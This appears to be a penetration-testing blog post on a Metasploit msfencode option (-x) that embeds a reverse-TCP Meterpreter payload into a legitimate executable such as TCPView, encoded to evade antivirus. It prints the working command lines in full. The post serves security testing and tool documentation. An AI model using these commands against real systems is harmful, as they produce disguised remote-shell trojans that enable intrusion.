<div class="header">
  <h1>Metasploit Blends in: New MSFPayload/ENcode</h1>
  <h2></h2>
</div>
<div class="content">
  <p>In <a href="https://metasploit.com/redmine/projects/framework/repository/revisions/7315">Revision 7315</a> of the Metasploit Framework (SVN) a new option was added to MSFENCODE. Technically you always had the ability to do the following, but it required a bit of knowledge of the inner workings of the framework.</p>

<p>But before I get into the new feature, lets quickly go over the standard way you use msfencode:</p>

<blockquote>
<p>root@bt4:/pentest/exploits/framework3# ./msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.92.131 LPORT=443 R | ./msfencode -t exe -o /tmp/bob.exe<br />
[*] x86/shikata_ga_nai succeeded with size 318 (iteration=1)</p>

<p>root@bt4:/pentest/exploits/framework3#</p>
</blockquote>

<p>We just used MSFPAYLOAD to output in [R]AW format, a reverse tcp connect meterpreter payload. We then piped it into MSFENCODE, so that we could output it as a proper Windows executable (/tmp/bob.exe), encoded to avoid AV detection.</p>

<p>Now if you knew where it was (data/templates/template.exe) you could probably just replace the template.exe with the one you want loaded with the payload and called it a day. But then you wouldnâ€™t get some of the tweaks that make this update awesome.</p>

<p>The update added the (-x) option to msfencode. This allows you to specify an executable of your choosing to sacrifice to the gods. For example: (TCPView)</p>

<blockquote>
<p>root@bt4:/pentest/exploits/framework3# ./msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.92.131 LPORT=443<br />
R | ./msfencode -t exe -x /tmp/Tcpview.exe -o /tmp/Tcpview2.exe<br />
[*] x86/shikata_ga_nai succeeded with size 318 (iteration=1)</p>

<p>root@bt4:/pentest/exploits/framework3#</p>
</blockquote>

<p>And if everything went well, we have a nice new executable in /tmp/ called Tcpview2.exe. Want to know the magic part? Try to tell them apart:</p>

<p>[](<a href="http://static.squarespace.com/static/5005c01d24ac90096800bd6a/51cff728e4b0b79cd4cd31cb/51cff72ae4b0b79cd4cd3899/1257220039893/WindowsLiveWriter-MetasploitBlendsinNewMSFPayloadENcode_14078-.com/static/5005c01d24ac90096800bd6a/51cff728e4b0b79cd4cd31cb/51cff72ae4b0b79cd4cd389a/1257220040032/WindowsLiveWriter-MetasploitBlendsinNewMSFPayloadENcode_14078-">http://static.squarespace.com/static/5005c01d24ac90096800bd6a/51cff728e4b0b79cd4cd31cb/51cff72ae4b0b79cd4cd3899/1257220039893/WindowsLiveWriter-MetasploitBlendsinNewMSFPayloadENcode_14078-.com/static/5005c01d24ac90096800bd6a/51cff728e4b0b79cd4cd31cb/51cff72ae4b0b79cd4cd389a/1257220040032/WindowsLiveWriter-MetasploitBlendsinNewMSFPayloadENcode_14078-</a>)</p>
